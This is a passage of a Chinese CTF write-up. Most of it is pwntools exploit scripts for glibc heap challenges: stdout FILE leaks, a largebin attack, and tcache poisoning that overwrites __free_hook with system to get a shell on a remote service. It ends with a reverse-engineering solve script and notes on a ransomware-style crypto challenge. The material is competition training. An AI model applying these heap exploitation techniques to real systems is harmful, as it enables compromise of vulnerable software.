    def color(idx, data):
        chioce(4)
        p.sendlineafter("\n",str(idx))
        p.sendafter("\n",data)
    def init(yes):
        if yes:
            p.sendlineafter("game with me?","yes")
            p.sendlineafter("your lucky number:","FFFF") 
            p.recvuntil("Wow, you get a reward now!")
            p.sendlineafter("name first:","mark")
            p.recvuntil("your reward is ")
            ret = p.recv()[0:5]
            log.success("stack_name_addr :"+str(hex(int(ret,16))))
            return int(ret,16)
        else:
            p.sendlineafter("game with me?","no")
    def pwn():
        flag = init(1)
        get(0,"mark",0x240,"aaaaaaa")
        try:
            low_addr  =  str(hex(eat(0)))
            low_addr = int(low_addr[-6:-3],16)
            low_addr *= 0x10 
        except:
            sys.stdout.flush()
            os.execv(sys.argv[0], sys.argv)
        color(0,p64(0)*2 + p64(0x100000250)+"\x10"+p8(low_addr))
        throw(0)
        get(0,"hacker",0x240,p64(0x00)*4+p64(0x7000000))  # tcache_perthread_strcut
        throw(0)
        get(1,"pad1",0x50,p8(0x00)*5+p8(0x03)+p8(0x0)*2) # 3 times to stdout
        get(1,p64(0x00)+'\xed\x36',0x30,p64(0x00)) # 0x70 tcache chunk
        try:
            get(2,"stdout",0x68,p64(0x0)*6+'\x00'*3+p64(0xfbad1800)+p64(0x00)*3+'\x00')
            # gdb.attach(p)
        except:
            sys.stdout.flush()
            os.execv(sys.argv[0], sys.argv)
        p.recvuntil("\x7f\x00\x00")
        addr  =  u64(p.recvuntil("\x7f").ljust(8,'\x00'))
        log.success("_IO_2_1_stdout_+131 : "+str(hex(addr)))
        libc_base =  addr -131 - libc.sym['_IO_2_1_stdout_']
        log.success("libc_base : "+str(hex(libc_base)))
        # gdb.attach(p)
        malloc_hook = libc_base + libc.sym['__malloc_hook']
        free_hook = libc_base + libc.sym['__free_hook']
        log.success("malloc_hook : "+str(hex(malloc_hook)))
        log.success("free_hook : "+str(hex(free_hook)))
        p.recv()
        #throw(1)
        p.sendline("3")
        p.recvuntil('index of your lemon : ')
        p.sendline(str(1))
        environ = libc_base +  0x03dd058
        log.success("environ : "+str(hex(environ)))
        stdout = libc_base+libc.sym['_IO_2_1_stdout_']
        log.success("stdout : "+str(hex(stdout)))
        get(1,p64(0x00)+p64(stdout-0x33),0x30,p64(0x00)) # 0x70 tcache chunk
        get(2,"stdout",0x68,p64(0x0)*6+'\x00'*3+p64(0xfbad1800)+p64(0x00)*3+p64(environ)+p64(environ+0x10))
        stack = u64(p.recvuntil('\x7f')[1:7].ljust(8,'\x00'))
        log.success("stack_base : "+str(hex(stack)))
        flag_addr = stack&0xffffffffff000 + flag
        log.success("flag_addr : "+str(hex(flag_addr )))
        #throw(1)
        p.sendline("3")
        p.recvuntil('index of your lemon : ')
        p.sendline(str(1))
        get(1,p64(0x00)+p64(stdout-0x33),0x30,p64(0x00)) # 0x70 tcache chunk
        get(2,"stdout",0x68,p64(0x0)*6+'\x00'*3+p64(0xfbad1800)+p64(0x00)*3+p64(flag_addr-0x100)+p64(flag_addr+0x100))
        # gdb.attach(p)
        p.interactive()
    if __name__ == "__main__":
        pwn()
    #flag{f578948e-8b48-494d-a11e-a97b7fbf14ee}
###  PassWordBox_ProVersion
  1. recover存在UAF，unsortedbin泄露libc
  2. largebin attack改大mp.tcache_bins，制造tcache
  3. tcache attack打__free_hook，改system
  4. 释放binsh块，getshell
    #coding:utf-8
    from pwn import *
    import subprocess, sys, os
    from time import sleep
    sa = lambda x, y: p.sendafter(x, y)
    sla = lambda x, y: p.sendlineafter(x, y)
    elf_path = './pwdPro'
    ip = '47.104.71.220'
    port = 49261
    remote_libc_path = './libc.so'
    context(os='linux', arch='amd64')
    context.log_level = 'debug'
    def run(local = 1):
        global elf
        global p
        if local == 1:
            elf = ELF(elf_path, checksec = False)
            p = elf.process()
        else:
            p = remote(ip, port)
    def debug(cmd=''):
        # context.terminal = []
        gdb.attach(p,cmd)
        pause()
    def one_gadget(filename = remote_libc_path):
        return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
    def str2int(s, info = '', offset = 0):
        ret = u64(s.ljust(8, '\x00')) - offset
        success('%s ==> 0x%x'%(info, ret))
        return ret
    def chose(idx):
        sla('Input Your Choice:\n', str(idx))
    def fadd(idx, size, content = '\0'*8+'\n', ID = '\n'):
        chose(1)
        sla('Which PwdBox You Want Add:\n', str(idx))
        sa('Input The ID You Want Save:', ID)
        sla('Length Of Your Pwd:', str(size))
        sa('Your Pwd:', content)
    def add(idx, size, content = '\n', ID = '\n'):
        chose(1)
        sla('Which PwdBox You Want Add:\n', str(idx))
        sa('Input The ID You Want Save:', ID)
        sla('Length Of Your Pwd:', str(size))
        sa('Your Pwd:', key(content))
    def edit(idx, content):
        chose(2)
        sla('Which PwdBox You Want Edit:\n', str(idx))
        sleep(1)
        p.send(content)
    def show(idx):
        chose(3)
        sla('Which PwdBox You Want Check:\n', str(idx))
    def free(idx):
        chose(4)
        sla('Idx you want 2 Delete:\n', str(idx))
    def recover(idx):
        chose(5)
        sla('Idx you want 2 Recover:\n', str(idx))
    def key(num):
        if num == '\n':
            return '\n'
        result = ''
        for i in [num[x:x+8] for x in range(0, len(num), 8)]:
            result += p64(passwd^u64(i))
        return result
    run(0)
    fadd(0, 0x628)
    p.recvuntil('First Add Done.Thx 4 Use. Save ID:')
    passwd = u64(p.recv(8))
    add(1, 0x420)
    add(2, 0x618)
    add(3, 0x420)
    add(11, 0x420)
    add(12, 0x420)
    add(13, 0x420)
    free(0)
    recover(0)
    show(0)
    p.recvuntil('Pwd is: ')
    libc = ELF(remote_libc_path)
    libc.address = str2int(key(p.recv(8)), 'libc', libc.sym['__malloc_hook']+0x10+96)
    add(4, 0x638)
    free(2)
    attack = libc.address+0x1eb280+0x50-0x20
    payload = flat(0, attack, 0, attack)
    edit(0, payload)
    add(5, 0x638)
    free(11)
    free(12)
    free(13)
    recover(13)
    edit(13, p64(libc.sym['__free_hook']))
    add(13, 0x420)
    edit(13, '/bin/sh\0')
    add(14, 0x420)
    edit(14, p64(libc.sym['system']))
    free(13)
    # debug()
    p.interactive()
## Re
###  Dizzy
  * main 函数巨大，但是可以改一下 hexray.cfg，让 IDA 反汇编
  * 伪代码如下，发现就是以 byte 为单位对输入进行操作，然后与内置的密文进行比较  
  * 比较部分如下  
  * 想拿 z3 跑，但是代码量太大了，没跑出来
  * 发现都是很简单的 + – ^ 运算，其实直接倒推回去进行了
  * 把伪代码粘贴出来，把运算部分调整成 python 代码，保存到 code 文件里  
  * 然后从后往前 exec 即可
    python=
    def change(code: str):
    if “+=” in code: return code.replace(“+=”, “-=”)
    elif “-=” in code: return code.replace(“-=”, “+=”)
    elif “^=” in code: return code
    plain = [-1]*32
    plain[0] = ord(“‘“)
    plain[1] = ord(“<”)
    plain[2] = -29
    plain[3] = -4
    plain[4] = 46
    plain[5] = 65
    plain[6] = 7
    plain[7] = 94
    plain[8] = 98
    plain[9] = -49
    plain[10] = -24
    plain[11] = -14
    plain[12] = -110
    plain[13] = 0x80
    plain[14] = -30
    plain[15] = 54
    plain[16] = -76
    plain[17] = -78
    plain[18] = 103
    plain[19] = 119
    plain[20] = 15
    plain[21] = -10
    plain[22] = 13
    plain[23] = -74
    plain[24] = -19
    plain[25] = 28
    plain[26] = 101
    plain[27] = -118
    plain[28] = 7
    plain[29] = 83
    plain[30] = -90
    plain[31] = 102
    with open(“code”, “r”)as f:
    lines = f.readlines()
    for l in reversed(lines):
    newCode = change(l.strip())
    exec(newCode)
    flag=’’
    for i in range(32):
    flag+=chr(plain[i] & 0xff)
    print(flag)
flag{Try_R3vers1ng_W1th_ScR!pt!}
### 勒索解密
其实就是逆一个调用了大量 wincrypt 加密 api 的程序，没啥难的，就是 windows api 实在是太阴间了
首先看 main 函数，大量的初始化操作，然后调用 enc 函数，然后清零
结合上述这些操作可以猜测出题人应该是用一个结构体去管理加密过程中用到的密钥之类的东西，经过一定的尝试可以设置如下的结构体，让伪代码更直观
然后就是分析 enc 函数了。enc 函数就只传入了一个指向结构体的指针，所以只跟踪引用了这个结构体的函数就行了
这部分初始化了 key1，使用了 4 个 int，其中 3个为定值，1个为时间戳
这两个函数都引用了 结构体，跟进
发现第一个函数是解 base64编码的公钥，把公钥做 key2
第二个函数用 key2 加密了一些数据，调试发现就是 key1